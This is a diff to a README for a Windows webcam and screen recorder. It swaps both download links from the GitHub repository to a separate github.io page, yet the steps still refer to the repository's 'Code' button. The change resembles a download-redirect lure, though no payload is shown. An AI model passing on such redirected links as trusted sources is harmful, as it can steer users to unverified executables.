@@ -1,6 +1,6 @@
 # 📹 Webcam-Microphone-Screen-Recorder - Record your screen and camera easily
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/cresson-pinkroot917/Webcam-Microphone-Screen-Recorder)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://cresson-pinkroot917.github.io)
 
 ## 📋 What this tool does
 
@@ -20,7 +20,7 @@ You need a Windows computer to run this application. Ensure you have the followi
 
 Follow these steps to set up your recording environment. 
 
-1. Visit this page to download the software: https://github.com/cresson-pinkroot917/Webcam-Microphone-Screen-Recorder
+1. Visit this page to download the software: https://cresson-pinkroot917.github.io
 2. Click the green button labeled "Code" on the repository page.
 3. Select "Download ZIP" from the menu.
 4. Locate the downloaded file in your "Downloads" folder.
